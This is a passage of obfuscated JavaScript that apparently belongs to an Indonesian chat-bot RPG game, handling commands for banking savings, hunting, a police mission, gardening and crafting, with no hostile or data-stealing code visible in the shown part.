_0x1ce978[_0x240d04(0x29a2)](_0x58f03c,_0x1ce978[_0x240d04(0x1453)]);else{const _0x47b2f4=await _0x1ce978[_0x240d04(0x22fc)](_0x182219),_0x16a4f3=_0x47b2f4[_0xb65b97]=_0x47b2f4[_0xb65b97]||{'money':0x0,'bank':0x0,'atm':0x0,'fullatm':0x2710};if(!_0x16a4f3||!_0x16a4f3['nama']||!_0x16a4f3['umur']){if(_0x1ce978[_0x240d04(0x21e4)](_0x1ce978[_0x240d04(0x2209)],_0x1ce978[_0x240d04(0x2209)]))_0x1d18f5[_0x240d04(0x15e)](_0x2ce0d4),_0x1ce978['MYkYd'](_0x372436,_0x240d04(0x2720)+'mulai\x20game'+'.');else return _0x1ce978[_0x240d04(0x1de6)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);}if(_0x16a4f3[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x1429)](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);_0x16a4f3[_0x240d04(0x1ee9)]=_0x16a4f3[_0x240d04(0x1ee9)]||0x0,_0x16a4f3['atm']=_0x16a4f3['atm']||0x0,_0x16a4f3[_0x240d04(0x1a9e)]=_0x16a4f3[_0x240d04(0x1a9e)]||0x2710;let _0xff07bb=_0x3e6565[_0x240d04(0x1ba2)](/^nabung/i,'')||_0x483c03[0x0]||'1',_0x47dacc=/all/i[_0x240d04(0x1dc7)](_0xff07bb)?Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x14fb)](_0x16a4f3['money'],_0x656587)):_0x1ce978[_0x240d04(0x1d40)](parseInt,_0xff07bb);_0x47dacc=Math['max'](0x1,isNaN(_0x47dacc)?0x1:_0x47dacc);if(_0x1ce978[_0x240d04(0x2537)](_0x16a4f3[_0x240d04(0x1e39)],0x0)){if(_0x1ce978[_0x240d04(0x2a58)](_0x1ce978[_0x240d04(0x110b)],_0x1ce978[_0x240d04(0x110b)]))_0x1ce978[_0x240d04(0x2de6)](_0x1215a2,_0x240d04(0xb17)+_0x240d04(0x2a04)+'an:\x20*'+_0x1ce978[_0x240d04(0x1fdb)](_0x135489,_0x394044)+'*'),delete _0x4b5ffc[_0x3fb734];else return _0x1ce978[_0x240d04(0x1734)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x24c8)+'TM!\x20Gunaka'+_0x240d04(0xc74)+_0x240d04(0x1497)+'uk\x20membuat'+_0x240d04(0x1eb6));}if(_0x16a4f3['bank']>=_0x16a4f3[_0x240d04(0x1a9e)])return _0x1ce978[_0x240d04(0xc0b)](_0x476bfb,_0x1ce978['UVCFt']);if(_0x47dacc>_0x1ce978[_0x240d04(0x10c0)](_0x16a4f3[_0x240d04(0x1a9e)],_0x16a4f3[_0x240d04(0x1ee9)]))return _0x1ce978['tWVqm'](_0x1ce978['BvtYo'],_0x1ce978[_0x240d04(0x19fb)])?_0x1ce978[_0x240d04(0x22a0)](_0x476bfb,_0x240d04(0x126b)+_0x240d04(0x2094)+'\x20di\x20bank.\x20'+'Sisa\x20kapas'+_0x240d04(0x201c)+_0x1ce978[_0x240d04(0x141)](_0x16a4f3['fullatm'],_0x16a4f3[_0x240d04(0x1ee9)])+'*'):_0x1ce978['snLvZ'](_0xf49b15,'❌\x20Kamu\x20sud'+_0x240d04(0x6a9)+_0x240d04(0x143c)+_0x240d04(0x218c)+_0x240d04(0x25ec)+_0x1ce978['JnYAb'](_0xe4e7dc,_0x2f8877)+_0x240d04(0x157d));if(_0x16a4f3[_0x240d04(0xd24)]>=_0x1ce978[_0x240d04(0xf6d)](_0x656587,_0x47dacc))return _0x1ce978[_0x240d04(0x1c04)](_0x240d04(0xfa8),_0x1ce978[_0x240d04(0x3eb)])?(_0x16a4f3[_0x240d04(0xd24)]-=_0x1ce978['ZmwSz'](_0x656587,_0x47dacc),_0x16a4f3[_0x240d04(0x1ee9)]+=_0x47dacc,await _0x1ce978[_0x240d04(0x104c)](_0x961430,_0x47b2f4),_0x1ce978[_0x240d04(0x1b21)](_0x476bfb,'✅\x20Berhasil'+'\x20menabung\x20'+'*'+_0x47dacc+(_0x240d04(0x947)+'ke\x20bank!'))):_0x5568d2[_0x2acd6d[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x368)](_0x33b414[_0x240d04(0x24f1)](),_0x15771e[_0x240d04(0x2b45)]))];else{if(_0x1ce978[_0x240d04(0x3a7)]('gpgWW',_0x240d04(0x121f)))return _0x1ce978[_0x240d04(0x713)](_0x476bfb,_0x240d04(0x239e)+_0x240d04(0x47b)+_0x240d04(0x200e)+'menabung\x20*'+_0x47dacc+_0x240d04(0x2828));else _0x1ce978[_0x240d04(0x182e)](_0x400788,_0x1ce978['MOGZk']+_0x3f804d[_0x240d04(0x960)]);}}}catch(_0x4a476b){console['error'](_0x4a476b),_0x1ce978[_0x240d04(0x21f6)](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x9e7)+'g.');}}}break;case _0x240d04(0x2ba7):{const _0x307b91=_0x5e4cc4=>{const _0x359933=_0x240d04;if(_0x1ce978[_0x359933(0x12c0)](_0x1ce978['vdYDp'],_0x1ce978['OdPQo'])){let _0x34aa88=Math[_0x359933(0xf02)](_0x5e4cc4/0x36ee80),_0x46e640=_0x1ce978[_0x359933(0xf46)](Math[_0x359933(0xf02)](_0x1ce978[_0x359933(0x106)](_0x5e4cc4,0xea60)),0x3c),_0x195277=Math['floor'](_0x1ce978[_0x359933(0x1877)](_0x5e4cc4,0x3e8))%0x3c;return[_0x34aa88,_0x46e640,_0x195277][_0x359933(0x16e6)](_0x2ff845=>_0x2ff845[_0x359933(0x2cb7)]()[_0x359933(0x1f96)](0x2,'0'))[_0x359933(0x86e)](':');}else return _0xd67400['error'](_0x5a52c6),_0x1ce978[_0x359933(0x20f6)](_0x27a780,_0x1ce978[_0x359933(0x931)]);};try{if(_0x1ce978[_0x240d04(0x72d)](_0x1ce978[_0x240d04(0x2241)],_0x1ce978[_0x240d04(0x11dd)]))return _0x49a2bd(_0x240d04(0x1c3d)+_0x1ce978[_0x240d04(0xc97)](_0x5bfa3d,_0x1c232b)+(_0x240d04(0x641)+'encoba\x20ban'+'sos\x20lagi.'));else{const _0x4f2c4b=await _0x1ce978[_0x240d04(0x1319)](_0x182219),_0x2a5d98=_0x4f2c4b[_0xb65b97]=_0x4f2c4b[_0xb65b97]||{'banteng':0x0,'harimau':0x0,'gajah':0x0,'kambing':0x0,'panda':0x0,'buaya':0x0,'kerbau':0x0,'sapi':0x0,'monyet':0x0,'babihutan':0x0,'babi':0x0,'ayam':0x0,'lastmisi':0x0};if(!_0x2a5d98||!_0x2a5d98[_0x240d04(0x2eea)]||!_0x2a5d98[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0xf35)](_0x1ce978['qeRSC'],_0x1ce978[_0x240d04(0x3b8)]))return _0x1ce978[_0x240d04(0x1d17)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);else try{delete _0x2f1feb[_0x240d04(0x1a15)][_0x55d854],_0x1ce978[_0x240d04(0x285d)](_0x3de1a3);}catch(_0x4314ef){_0x1ce978['ZqnGK'](_0x199a6b,_0x4314ef);}}if(_0x2a5d98[_0x240d04(0x2344)])return _0x1ce978['HHGNo'](_0x476bfb,_0x1ce978['IYBbO']);const _0x566960=Date['now'](),_0x3e2ed9=0x3c*0x3c*0x3e8,_0x183588=_0x1ce978['eENIW'](_0x2a5d98[_0x240d04(0x25c4)],_0x3e2ed9)-_0x566960;global['misi']=global['misi']||{};if(global[_0x240d04(0xbe8)][_0xb65b97]){if(_0x1ce978[_0x240d04(0x21ee)](_0x1ce978[_0x240d04(0x2840)],_0x1ce978[_0x240d04(0x2840)]))_0x27914c[_0x240d04(0x15e)](_0x1ce978[_0x240d04(0x3ad)],_0x174cac),_0x1ce978[_0x240d04(0xfa3)](_0x442dc7,'Gagal\x20meng'+_0x240d04(0x1ded)+_0x240d04(0x1d2)+':\x20'+_0x5b699a[_0x240d04(0x960)]);else return _0x1ce978[_0x240d04(0x21aa)](_0x476bfb,_0x240d04(0x2b2b)+_0x240d04(0x2d5d)+global[_0x240d04(0xbe8)][_0xb65b97][0x0]+_0x240d04(0x2fb));}if(_0x1ce978['KBuzb'](_0x183588,0x0))return _0x1ce978[_0x240d04(0x273f)](_0x476bfb,_0x240d04(0xfcf)+_0x240d04(0x11dc)+_0x307b91(_0x183588)+(_0x240d04(0x20ef)+'berburu\x20la'+_0x240d04(0x1dbb)));const _0xca9f68={'banteng':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x171d)](Math[_0x240d04(0x24f1)](),0xa)),'harimau':Math[_0x240d04(0xf02)](_0x1ce978['UyIYi'](Math[_0x240d04(0x24f1)](),0xa)),'gajah':Math['floor'](_0x1ce978[_0x240d04(0x2a50)](Math[_0x240d04(0x24f1)](),0xa)),'kambing':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x368)](Math[_0x240d04(0x24f1)](),0xa)),'panda':Math[_0x240d04(0xf02)](_0x1ce978['CnBHf'](Math[_0x240d04(0x24f1)](),0xa)),'buaya':Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*0xa),'kerbau':Math[_0x240d04(0xf02)](_0x1ce978['PAgUL'](Math[_0x240d04(0x24f1)](),0xa)),'sapi':Math[_0x240d04(0xf02)](_0x1ce978['qxZWU'](Math[_0x240d04(0x24f1)](),0xa)),'monyet':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2ce9)](Math[_0x240d04(0x24f1)](),0xa)),'babihutan':Math[_0x240d04(0xf02)](Math['random']()*0xa),'babi':Math[_0x240d04(0xf02)](_0x1ce978['jmfpl'](Math[_0x240d04(0x24f1)](),0xa)),'ayam':Math['floor'](_0x1ce978[_0x240d04(0x2c7a)](Math[_0x240d04(0x24f1)](),0xa))};for(let _0x12d8fb in _0xca9f68){_0x1ce978[_0x240d04(0x2e0a)]!==_0x1ce978[_0x240d04(0x2e0a)]?(_0x4b9167[_0x240d04(0x15e)](_0x1eac65),_0x1ce978[_0x240d04(0x2860)](_0x8569d6,_0x240d04(0x976)+'rim\x20pesan:'+'\x0a'+(_0x432b38['descriptio'+'n']||_0x43ad84[_0x240d04(0x960)]))):_0x2a5d98[_0x12d8fb]=_0x1ce978[_0x240d04(0x518)](_0x2a5d98[_0x12d8fb]||0x0,_0xca9f68[_0x12d8fb]);}const _0x3610cf=_0x1ce978[_0x240d04(0x298b)]('*🕸\x20Hasil\x20B'+'erburu\x20'+_0x1ce978['lrktt'](_0x19007e,_0x1ce978[_0x240d04(0x2b08)])+_0x240d04(0x2b49),Object[_0x240d04(0x1121)](_0xca9f68)[_0x240d04(0xfc3)](([_0x3c06ff,_0x5f8098])=>_0x5f8098>0x0)[_0x240d04(0x16e6)](([_0x33d060,_0x47938a])=>{const _0x558e49=_0x240d04;if(_0x1ce978[_0x558e49(0x2d14)](_0x1ce978['myRNa'],_0x1ce978[_0x558e49(0x58a)])){const _0x3af18e={'banteng':'🐂','harimau':'🐅','gajah':'🐘','kambing':'🐐','panda':'🐼','buaya':'🐊','kerbau':'🐃','sapi':'🐮','monyet':'🐒','babihutan':'🐗','babi':'🐖','ayam':'🐓'}[_0x33d060];return _0x3af18e+'\x20'+_0x1ce978['lmgUf'](_0x2ca95e,_0x33d060)+':\x20'+_0x47938a;}else return _0x1ce978[_0x558e49(0x17e5)](_0x2307b2,_0x558e49(0x23ff)+_0x558e49(0x1999)+_0x558e49(0xa76)+_0x558e49(0x262)+_0x1ce978[_0x558e49(0x22e0)](_0xd64e9e,_0x4590d8)+(_0x558e49(0x19c0)+_0x558e49(0x1610)+_0x558e49(0x100e)));})['join']('\x0a'));global[_0x240d04(0xbe8)][_0xb65b97]=[_0x1ce978[_0x240d04(0xf13)]],_0x2a5d98[_0x240d04(0x25c4)]=_0x566960,await _0x1ce978['VPEWq'](_0x961430,_0x4f2c4b),setTimeout(()=>_0x476bfb(_0x3610cf),0x4e20),_0x1ce978[_0x240d04(0x914)](setTimeout,()=>_0x476bfb(_0x240d04(0x9f2)+'a'),0x4650),_0x1ce978[_0x240d04(0x2093)](setTimeout,()=>_0x476bfb(_0x240d04(0x1045)),0x3a98),setTimeout(()=>_0x476bfb(_0x240d04(0x38d)+_0x240d04(0xce0)),0x36b0),setTimeout(()=>_0x476bfb('Sedang\x20men'+_0x240d04(0x1f99)+_0x240d04(0x1217)),0x0),_0x1ce978['MXkzV'](setTimeout,()=>delete global[_0x240d04(0xbe8)][_0xb65b97],0x5208);}}catch(_0x3e77d0){_0x1ce978['cjtCA'](_0x1ce978['DaoTz'],_0x240d04(0x21eb))?(console[_0x240d04(0x15e)](_0x3e77d0),_0x1ce978['suSvB'](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0xfc1)+'.')):(_0xcdd5b1('⏱️\x20Waktu\x20ha'+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0xb7b)](_0x606b4f,_0x3e1888)+'*'),delete _0x4ea002[_0x5536f4]);}}break;case _0x240d04(0x2a4d):{if(_0x1ce978[_0x240d04(0xdf6)](_0x240d04(0x2bcd),_0x240d04(0x2bcd)))_0x1ce978[_0x240d04(0xb74)](_0x2f08e4,_0x2fba7b,_0x5d30c9[_0x240d04(0x2b45)],_0x240d04(0x246e));else{const _0x2572d0=_0x29d815=>{const _0xa23743=_0x240d04;if(_0x1ce978['ZNAdD']===_0x1ce978['ZNAdD']){let _0x21dabc=Math[_0xa23743(0xf02)](_0x1ce978[_0xa23743(0xc29)](_0x29d815,0x36ee80)),_0x4c2e2a=_0x1ce978[_0xa23743(0x237f)](Math[_0xa23743(0xf02)](_0x29d815/0xea60),0x3c),_0x47d254=Math[_0xa23743(0xf02)](_0x29d815/0x3e8)%0x3c;return[_0x21dabc,_0x4c2e2a,_0x47d254][_0xa23743(0x16e6)](_0x43c85a=>_0x43c85a[_0xa23743(0x2cb7)]()[_0xa23743(0x1f96)](0x2,0x0))[_0xa23743(0x86e)](':');}else return _0x1ce978[_0xa23743(0xc21)](_0x128f74,_0xa23743(0x19fe)+_0xa23743(0x23c6)+_0xa23743(0x1813)+_0xa23743(0x33b)+_0xa23743(0x2cfd)+_0xa23743(0x163d)+_0xa23743(0x2d8a));};try{const _0x3f5c55=await _0x182219(),_0x168484=_0x3f5c55[_0xb65b97]=_0x3f5c55[_0xb65b97]||{'money':0x0,'exp':0x0,'ojekk':0x0,'lastmisi':0x0};if(!_0x168484||!_0x168484[_0x240d04(0x2eea)]||!_0x168484[_0x240d04(0x634)])return _0x1ce978['bUTWV'](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x168484[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x218b)](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);_0x168484[_0x240d04(0x25c4)]=_0x168484[_0x240d04(0x25c4)]||0x0;const _0x11fa2a=Date[_0x240d04(0x104e)](),_0x222e2e=_0x1ce978['wsjRj'](_0x1ce978[_0x240d04(0xb4e)](0x3c,0x3c),0x3e8),_0x1f5636=_0x1ce978[_0x240d04(0x2264)](_0x168484[_0x240d04(0x25c4)],_0x222e2e)-_0x11fa2a;global[_0x240d04(0xbe8)]=global['misi']||{};if(global[_0x240d04(0xbe8)][_0xb65b97]){if(_0x1ce978[_0x240d04(0x1f9f)](_0x1ce978[_0x240d04(0x5ab)],_0x240d04(0x14f4)))_0x3775ae[_0x5c4b6b]&&_0x1ce978[_0x240d04(0x2a22)](_0x1ce978[_0x240d04(0x17f4)](_0x2bc873[_0x240d04(0x104e)](),_0x4df659[_0x9a4097][_0x240d04(0x1e3f)]),0xea60)&&(_0x1ce978[_0x240d04(0x2069)](_0x35023a,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x1f31)](_0x18269a,_0x4e179d)+'*'),delete _0x4a1bca[_0x2491be]);else return _0x1ce978[_0x240d04(0x2e16)](_0x476bfb,_0x240d04(0x2b2b)+_0x240d04(0x2d5d)+global[_0x240d04(0xbe8)][_0xb65b97][0x0]+_0x240d04(0x2fb));}if(_0x1ce978['cfYom'](_0x1f5636,0x0)){if(_0x1ce978[_0x240d04(0x139b)](_0x1ce978[_0x240d04(0x110)],_0x1ce978[_0x240d04(0x8fd)]))_0x16938e[_0x240d04(0x15e)](_0x4e5f41),_0x1ce978[_0x240d04(0x13a4)](_0x2576a2,'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x1d8e)+_0x240d04(0x1daa)+_0x240d04(0x2ed9));else return _0x1ce978[_0x240d04(0x1046)](_0x476bfb,_0x240d04(0xfcf)+_0x240d04(0x11dc)+_0x1ce978['XbnBj'](_0x2572d0,_0x1f5636)+(_0x240d04(0x20ef)+_0x240d04(0x150c)+_0x240d04(0xf96)+_0x240d04(0x752)));}const _0x385f95=_0x1ce978[_0x240d04(0x12d6)],_0x3b39c3=_0x1ce978[_0x240d04(0xd2a)](Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1571)](Math['random'](),0xa)),0x186a0),_0xeb4de0=_0x1ce978['jjtpv'](Math['floor'](_0x1ce978[_0x240d04(0x105c)](Math[_0x240d04(0x24f1)](),0xa)),0x3e8),_0xc89bc9=_0x168484[_0x240d04(0x1e6d)]||0x0,_0x2ae727=('\x0a*—[\x20Hasil'+'\x20Polisi\x20'+_0x1ce978['hMdkF'](_0x19007e,_0x1ce978[_0x240d04(0x2b08)])+('\x20]—*\x0a➕\x20💹\x20U'+_0x240d04(0xb7a))+_0x3b39c3[_0x240d04(0x17bf)+'ring']()+('\x0a➕\x20✨\x20Exp\x20='+'\x20')+_0xeb4de0+(_0x240d04(0xf10)+_0x240d04(0xb26)+_0x240d04(0x2e13)+_0x240d04(0x1d1a)+_0x240d04(0x2c15)+_0x240d04(0x164))+_0xc89bc9+'\x0a')[_0x240d04(0x2d6d)]();_0x168484[_0x240d04(0xd24)]+=_0x3b39c3,_0x168484['exp']+=_0xeb4de0,_0x168484[_0x240d04(0x1e6d)]+=0x1,_0x168484[_0x240d04(0x25c4)]=_0x11fa2a,await _0x1ce978[_0x240d04(0x1604)](_0x961430,_0x3f5c55),global['misi'][_0xb65b97]=[_0x385f95],_0x1ce978['YrPSp'](setTimeout,()=>delete global['misi'][_0xb65b97],0x6d60),_0x1ce978['fwDyG'](setTimeout,()=>_0x476bfb(_0x2ae727),0x6978),_0x1ce978[_0x240d04(0x2594)](setTimeout,()=>_0x476bfb('➕\x20💹\x20Meneri'+_0x240d04(0x28a7)),0x61a8),_0x1ce978[_0x240d04(0x2594)](setTimeout,()=>_0x476bfb(_0x240d04(0x27ac)+'ke\x20kantor\x20'+_0x240d04(0x26ce)+_0x240d04(0x9a5)+'a...'),0x4e20),_0x1ce978[_0x240d04(0x56d)](setTimeout,()=>_0x476bfb(_0x240d04(0x356)+'p\x20pencuri.'+'..'),0x3a98),_0x1ce978[_0x240d04(0x1430)](setTimeout,()=>_0x476bfb(_0x240d04(0x2367)+_0x240d04(0x1fee)+'.'),0x2710),_0x1ce978[_0x240d04(0x227f)](setTimeout,()=>_0x476bfb('🔍\x20Sedang\x20b'+_0x240d04(0x417)+'..'),0x0);}catch(_0x4186fd){if(_0x1ce978[_0x240d04(0x281e)](_0x240d04(0x1888),_0x1ce978['oRluA']))return _0x1ce978[_0x240d04(0x1bb2)](_0x1d33aa,'Belum\x20ada\x20'+'user\x20premi'+'um.');else console[_0x240d04(0x15e)](_0x4186fd),_0x1ce978['ampQA'](_0x476bfb,_0x1ce978[_0x240d04(0xa57)]);}}}break;case _0x240d04(0x2743):{const _0x1876e3=_0x1118a6=>{const _0x4a063e=_0x240d04;let _0x560d2e=Math[_0x4a063e(0xf02)](_0x1ce978[_0x4a063e(0x154c)](_0x1118a6,0x36ee80)),_0x2a4559=_0x1ce978[_0x4a063e(0x198f)](Math[_0x4a063e(0xf02)](_0x1ce978['sTqAl'](_0x1118a6,0xea60)),0x3c),_0x2cbb38=_0x1ce978[_0x4a063e(0x185)](Math[_0x4a063e(0xf02)](_0x1ce978[_0x4a063e(0x200a)](_0x1118a6,0x3e8)),0x3c);return[_0x560d2e,_0x2a4559,_0x2cbb38]['map'](_0x302df1=>_0x302df1[_0x4a063e(0x2cb7)]()[_0x4a063e(0x1f96)](0x2,0x0))[_0x4a063e(0x86e)](':');},_0x8a3b5d=_0x1c574b=>{const _0x4dc2ad=_0x240d04,_0x5d0f35={'pisang':'🍌','anggur':'🍇','mangga':'🥭','jeruk':'🍊','apel':'🍎','bibitpisang':_0x4dc2ad(0x23a4),'bibitanggur':_0x1ce978[_0x4dc2ad(0x1cd)],'bibitmangga':_0x1ce978['Rqkli'],'bibitjeruk':_0x1ce978['TlWVR'],'bibitapel':_0x1ce978[_0x4dc2ad(0x8cb)]};return _0x5d0f35[_0x1c574b]||'';};try{const _0x265d60=await _0x1ce978['StPhF'](_0x182219),_0x1e69e5=_0x265d60[_0xb65b97]=_0x265d60[_0xb65b97]||{'pisang':0x0,'anggur':0x0,'mangga':0x0,'jeruk':0x0,'apel':0x0,'bibitpisang':0x0,'bibitanggur':0x0,'bibitmangga':0x0,'bibitjeruk':0x0,'bibitapel':0x0,'lastberkebon':0x0};if(!_0x1e69e5||!_0x1e69e5['nama']||!_0x1e69e5['umur'])return _0x1ce978['PfhoH'](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a));if(_0x1e69e5[_0x240d04(0x2344)]){if(_0x1ce978[_0x240d04(0x2895)](_0x1ce978[_0x240d04(0x2d3b)],_0x1ce978[_0x240d04(0x1875)])){if(!_0x3a1775)return _0x1ce978[_0x240d04(0x19e)](_0x4a2f96,_0x1ce978[_0x240d04(0xe02)]);_0x1ce978[_0x240d04(0x2d13)](_0x503922,_0x240d04(0x104f)+_0x240d04(0xd51)+_0x240d04(0x1abd)+'m!');}else return _0x1ce978['EIRCB'](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);}_0x1e69e5[_0x240d04(0xea1)+'on']=_0x1e69e5[_0x240d04(0xea1)+'on']||0x0;const _0x2a81f7=Date[_0x240d04(0x104e)](),_0x51d575=_0x1ce978[_0x240d04(0x26c4)](_0x1ce978[_0x240d04(0xf19)](0x1e,0x3c),0x3e8),_0x486982=_0x1ce978[_0x240d04(0xdd)](_0x1ce978['lpzJY'](_0x1e69e5['lastberkeb'+'on'],_0x51d575),_0x2a81f7);global[_0x240d04(0xbe8)]=global['misi']||{};if(global[_0x240d04(0xbe8)][_0xb65b97])return _0x1ce978[_0x240d04(0x980)](_0x476bfb,_0x240d04(0x2b2b)+'\x20misi\x20*'+global['misi'][_0xb65b97][0x0]+_0x240d04(0x2fb));const _0x2d6ee8=[];if(_0x1ce978[_0x240d04(0x3d2)](_0x1e69e5[_0x240d04(0x1d2a)+'g'],0x64))_0x2d6ee8[_0x240d04(0x7dc)](_0x1ce978[_0x240d04(0x98a)](_0x8a3b5d,_0x240d04(0x1d2a)+'g')+(_0x240d04(0x1a14)+'ang\x20(')+_0x1e69e5[_0x240d04(0x1d2a)+'g']+_0x240d04(0x36f));if(_0x1ce978[_0x240d04(0x8e4)](_0x1e69e5['bibitanggu'+'r'],0x64))_0x2d6ee8[_0x240d04(0x7dc)](_0x1ce978[_0x240d04(0x2473)](_0x8a3b5d,'bibitanggu'+'r')+(_0x240d04(0x1646)+_0x240d04(0x273b))+_0x1e69e5['bibitanggu'+'r']+_0x240d04(0x36f));if(_0x1ce978[_0x240d04(0x10fb)](_0x1e69e5[_0x240d04(0x1c52)+'a'],0x64))_0x2d6ee8[_0x240d04(0x7dc)](_0x1ce978[_0x240d04(0x136f)](_0x8a3b5d,_0x1ce978['uhaCA'])+(_0x240d04(0x182d)+_0x240d04(0x24eb))+_0x1e69e5[_0x240d04(0x1c52)+'a']+_0x240d04(0x36f));if(_0x1ce978[_0x240d04(0x2a6f)](_0x1e69e5[_0x240d04(0x9dd)],0x64))_0x2d6ee8[_0x240d04(0x7dc)](_0x1ce978['gbyqu'](_0x8a3b5d,_0x1ce978[_0x240d04(0x1964)])+('\x20Bibit\x20Jer'+_0x240d04(0x9d6))+_0x1e69e5[_0x240d04(0x9dd)]+'/100)');if(_0x1e69e5[_0x240d04(0x965)]<0x64)_0x2d6ee8[_0x240d04(0x7dc)](_0x1ce978['yhrEs'](_0x8a3b5d,_0x1ce978[_0x240d04(0x1550)])+(_0x240d04(0x158)+_0x240d04(0x1df7))+_0x1e69e5['bibitapel']+_0x240d04(0x36f));if(_0x1ce978[_0x240d04(0x23ef)](_0x486982,0x0)){if(_0x1ce978['IQnwY'](_0x1ce978[_0x240d04(0xd8f)],_0x240d04(0xf93)))_0x328213[_0x240d04(0x15e)](_0x29bdd8),_0x1ce978[_0x240d04(0x14fc)](_0x44d8b5,_0x1ce978['uJpFr']);else return _0x476bfb('⏳\x20Mohon\x20me'+_0x240d04(0x1eea)+_0x1ce978[_0x240d04(0x182f)](_0x1876e3,_0x486982)+('*\x20untuk\x20be'+'rkebun\x20kem'+_0x240d04(0x24cf)));}if(_0x2d6ee8[_0x240d04(0x2b45)])return _0x1ce978[_0x240d04(0x104d)](_0x476bfb,_0x240d04(0x2dad)+_0x240d04(0x1b78)+'ibit\x20berik'+_0x240d04(0x24dc)+_0x2d6ee8[_0x240d04(0x86e)]('\x0a'));const _0x102a57={'pisang':Math[_0x240d04(0xf02)](_0x1ce978['tzpEM'](Math[_0x240d04(0x24f1)](),0x64)),'anggur':Math['floor'](_0x1ce978[_0x240d04(0x2349)](Math[_0x240d04(0x24f1)](),0x64)),'mangga':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1ae4)](Math[_0x240d04(0x24f1)](),0x64)),'jeruk':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2ad3)](Math[_0x240d04(0x24f1)](),0x64)),'apel':Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*0x64)};for(let _0x15fed9 in _0x102a57){_0x1e69e5[_0x15fed9]+=_0x102a57[_0x15fed9];}_0x1e69e5[_0x240d04(0x1d2a)+'g']-=0x64,_0x1e69e5['bibitanggu'+'r']-=0x64,_0x1e69e5[_0x240d04(0x1c52)+'a']-=0x64,_0x1e69e5[_0x240d04(0x9dd)]-=0x64,_0x1e69e5['bibitapel']-=0x64,_0x1e69e5['lastberkeb'+'on']=_0x2a81f7,await _0x961430(_0x265d60),global[_0x240d04(0xbe8)][_0xb65b97]=['Berkebun'],setTimeout(()=>delete global[_0x240d04(0xbe8)][_0xb65b97],0x4e20),_0x1ce978[_0x240d04(0x1b17)](setTimeout,()=>{const _0x4cc02c=_0x240d04;_0x1ce978[_0x4cc02c(0xc97)](_0x476bfb,'⌛\x20*Hasil\x20P'+'anen:*\x0a\x0a'+Object[_0x4cc02c(0x1121)](_0x102a57)[_0x4cc02c(0x16e6)](([_0x1b574d,_0x9bcc4f])=>'+\x20'+_0x8a3b5d(_0x1b574d)+'\x20'+_0x2ca95e(_0x1b574d)+':\x20'+_0x9bcc4f)[_0x4cc02c(0x86e)]('\x0a'));},0x4e20),_0x1ce978[_0x240d04(0x2917)](setTimeout,()=>_0x476bfb(_0x240d04(0x1754)+'anam\x20bibit'+'...'),0x0);}catch(_0x1cf577){_0x1ce978[_0x240d04(0x2c47)](_0x1ce978['FRHPv'],_0x1ce978[_0x240d04(0x24b5)])?(console[_0x240d04(0x15e)](_0x1cf577),_0x1ce978[_0x240d04(0xaed)](_0x476bfb,'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x283d)+'n.')):_0x1ce978[_0x240d04(0x18cd)](_0x1082f6,_0x51d51b,_0x341feb['length'],_0x1ce978[_0x240d04(0x186b)]);}}break;case _0x1ce978['nOHGN']:{const _0x520cf1=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0xbfa56d=_0x350b03=>_0x350b03[_0x240d04(0x211a)](0x0)[_0x240d04(0xdd3)+'e']()+_0x350b03[_0x240d04(0x728)](0x1),_0x43f4f3={'pickaxe':{'wood':0xa,'rock':0x5,'iron':0x5,'string':0x14},'sword':{'wood':0xa,'iron':0xf},'fishingrod':{'wood':0xa,'iron':0x2,'string':0x14},'armor':{'iron':0x1e,'emerald':0x1,'diamond':0x5},'atm':{'emerald':0x3,'diamond':0x6,'money':0x2710}},_0x53b9e3={'pickaxe':()=>({'pickaxe':0x1,'pickaxedurability':0x28}),'sword':()=>({'sword':0x1}),'fishingrod':()=>({'pancingan':0x1}),'armor':()=>({'armor':0x1}),'atm':()=>({'atm':0x1})};try{const _0x29c338=await _0x1ce978['GCjNg'](_0x182219),_0x338416=_0x29c338[_0xb65b97]=_0x29c338[_0xb65b97]||{};if(!_0x338416||!_0x338416[_0x240d04(0x2eea)]||!_0x338416['umur'])return _0x1ce978['RkYNY'](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x338416[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x18bb)](_0x476bfb,_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x2b5c)+_0x240d04(0x2826)+_0x240d04(0x1fbc)+_0x240d04(0x1310)+_0x240d04(0x260)+'bas*\x20untuk'+'\x20membayar\x20'+_0x240d04(0x7af)+_0x240d04(0x2e65)+_0x240d04(0xe32));const _0x4c33c0=_0x43f4f3[_0x520cf1];if(!_0x4c33c0)return 